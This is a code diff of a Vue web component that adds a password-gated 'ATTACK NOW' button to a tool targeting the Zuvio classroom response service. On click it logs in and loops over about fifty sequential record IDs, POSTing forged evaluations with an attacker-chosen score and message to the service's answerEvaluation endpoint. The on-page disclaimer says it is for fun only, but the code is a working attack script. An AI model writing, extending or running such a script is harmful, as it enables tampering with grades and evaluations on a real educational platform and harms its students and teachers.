@@ -25,7 +25,29 @@
 
           <div>純屬娛樂，請勿自行嘗試。</div>
         </v-card-text>
-
+        <v-col cols="12" sm="6">
+          <v-text-field
+            v-model="password"
+            :append-icon="show1 ? 'mdi-eye' : 'mdi-eye-off'"
+            :rules="[rules.required, rules.min]"
+            :type="show1 ? 'text' : 'password'"
+            name="input-10-1"
+            label="請輸入攻擊執行確認碼"
+            v-if="!verified"
+            @click:append="show1 = !show1"
+          ></v-text-field>
+          <div class="my-2">
+            <v-btn
+              v-if="!verified"
+              dark
+              depressed
+              @click="verifiedNow"
+              class="deep-purple accent-4"
+              ><v-icon>mdi-card-search</v-icon><b>驗證攻擊碼</b></v-btn
+            >
+          </div>
+        </v-col>
+        <p v-if="attackStatus" class="white--text green"><b>攻擊完畢！</b></p>
         <v-card-actions justify="center" align="center">
           <v-btn
             block
@@ -34,9 +56,10 @@
             center
             x-large
             color="success"
-            dark
+            :disabled="!(attackStatus === false && verified === true)"
+            v-if="verified"
             @click="attackClicked"
-            >ATTACK NOW!!</v-btn
+            ><v-icon class="mx-2">mdi-crosshairs-gps</v-icon>ATTACK NOW!!</v-btn
           >
         </v-card-actions>
       </v-card>
@@ -65,9 +88,32 @@ export default {
     mainImage
   },
   data: () => ({
-    attackStatus: false
+    attackStatus: false,
+    verified: false,
+    password: "",
+    show1: false,
+    scoreUWant: 0,
+    msg: "",
+    inputStatus: true,
+    rules: {
+      required: value => !!value || "請輸入密碼",
+      min: v => v.length >= 8 || "至少8個字"
+    }
   }),
   methods: {
+    verifiedNow() {
+      if (this.password === "0202494c0063") {
+        this.verified = true;
+      } else {
+        if (this.inputStatus) {
+          this.scoreUWant = Number(this.password);
+          this.inputStatus = !this.inputStatus;
+        } else {
+          this.msg = this.password;
+          this.inputStatus = !this.inputStatus;
+        }
+      }
+    },
     attackClicked() {
       if (!this.attackStatus) {
         this.loginGET();
@@ -75,6 +121,8 @@ export default {
         for (let i = 2761670; i <= 2761720; i++) {
           this.attackPOST(i);
         }
+        this.attackStatus = true;
+        this.$vuetify.theme.dark = true;
       }
     },
     async loginGET() {
@@ -87,7 +135,9 @@ export default {
       await api.post("/irs/submitLogin", bodyFormData);
     },
     async attackPOST(i) {
-      let answers = [{ id: "400875", answer: "test87", score: 4 }];
+      let answers = [
+        { id: "400875", answer: this.msg, score: this.scoreUWant }
+      ];
       let my_data = {
         url: "https://irs.zuvio.com.tw" + "/app_v2/answerEvaluation",
         type: "POST",
